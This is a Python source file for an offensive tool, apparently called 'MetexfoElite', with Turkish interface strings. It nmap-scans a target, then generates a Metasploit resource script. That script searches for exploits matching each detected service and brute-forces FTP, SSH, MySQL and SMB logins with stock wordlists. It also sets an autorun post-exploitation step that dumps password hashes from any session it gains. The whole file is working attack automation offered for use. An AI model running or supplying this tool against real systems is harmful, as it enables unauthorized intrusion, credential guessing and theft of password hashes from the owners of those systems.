import nmap
import argparse
import os
import sys
import time
from colorama import Fore, Style, init

init(autoreset=True)

class MetexfoElite:
    def __init__(self, target, lhost):
        self.target = target
        self.lhost = lhost
        self.rc_file = "metexfo_elite.rc"
        self.user_list = "/usr/share/wordlists/metasploit/namelist.txt"
        self.pass_list = "/usr/share/wordlists/metasploit/unix_passwords.txt"
        self.msf_commands = [
            f"setg RHOSTS {target}",
            f"setg LHOST {lhost}",
            "setg THREADS 50",
            "setg VERBOSE true",
            "setg PromptTimeFormat %H:%M:%S",
            "spool metexfo_operation.log"
        ]

    def banner(self):
        os.system('clear')
        print(f"""{Fore.RED}{Style.BRIGHT}
    ███╗   ███╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔═══██╗
    ██╔████╔██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║   ██║
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║   ██║
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██╔╝ ██╗██║     ╚██████╔╝
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ 
{Fore.YELLOW}    >> SIGNATURE  : METEXFO | VERSION : 1.0 | GHOST0X02
{Fore.CYAN}    >> TARGET     : {self.target} | LHOST : {self.lhost}
{Fore.WHITE}    {"="*85}""")

    def scan_and_analyze(self):
        print(f"{Fore.GREEN}[*]{Fore.WHITE} Taranıyor...")
        nm = nmap.PortScanner()
        nm.scan(self.target, arguments="-sV -O -Pn --open -T4")
        
        found_data = False
        for host in nm.all_hosts():
            print(f"{Fore.BLUE}[+]{Fore.WHITE} OS Tespiti: {nm[host].get('osmatch', [{'name': 'Bilinmiyor'}])[0]['name']}")
            
            for proto in nm[host].all_protocols():
                ports = sorted(nm[host][proto].keys())
                for port in ports:
                    found_data = True
                    service = nm[host][proto][port]
                    s_name = service['name']
                    s_ver = f"{service['version']} {service['extrainfo']}".strip()
                    print(f"{Fore.CYAN}[PORT {port}]{Fore.WHITE} {s_name} | {Fore.YELLOW}{s_ver if s_ver else 'Gizli'}")

                    if s_ver:
                        self.msf_commands.append(f"\n# --- VULN SEARCH: {s_name} {s_ver} ---")
                        self.msf_commands.append(f"search name:{s_name} type:exploit")
                    self.add_brute_logic(port, s_name)

        return found_data

    def add_brute_logic(self, port, name):
        mapping = {
            21: "auxiliary/scanner/ftp/ftp_login",
            22: "auxiliary/scanner/ssh/ssh_login",
            2222: "auxiliary/scanner/ssh/ssh_login",
            3306: "auxiliary/scanner/mysql/mysql_login",
            445: "auxiliary/scanner/smb/smb_login"
        }
        if port in mapping:
            self.msf_commands.append(f"\n# --- AUTO-BRUTE FOR PORT {port} ---")
            self.msf_commands.append(f"use {mapping[port]}")
            self.msf_commands.append(f"set RPORT {port}")
            self.msf_commands.append(f"set USER_FILE {self.user_list}")
            self.msf_commands.append(f"set PASS_FILE {self.pass_list}")
            self.msf_commands.append("set STOP_ON_SUCCESS true")
            self.msf_commands.append("run")

    def post_exploitation_setup(self):
        self.msf_commands.append("\n# --- GHOST PROTOCOL (POST-EXPLOIT) ---")
        self.msf_commands.append("setg AUTORUNSCRIPT multi_console_command -c 'getuid,sysinfo,hashdump'")
        self.msf_commands.append("sessions -l")

    def finalize(self):
        with open(self.rc_file, "w") as f:
            f.write("\n".join(self.msf_commands))
        print(f"\n{Fore.MAGENTA}[GHOST0X02]{Fore.WHITE} RC dosyası >  {Fore.YELLOW}{self.rc_file}")
        print(f"{Fore.RED}{Style.BRIGHT}>> KOMUT: {Fore.WHITE}msfconsole -q -r {self.rc_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Hedef IP")
    parser.add_argument("-L", "--lhost", required=True, help="Yerel IP (Dinleyici)")
    args = parser.parse_args()

    elite = MetexfoElite(args.target, args.lhost)
    elite.banner()
    if elite.scan_and_analyze():
        elite.post_exploitation_setup()
        elite.finalize()
    else:
        print(f"{Fore.RED}[!] Port bulunamadı.")
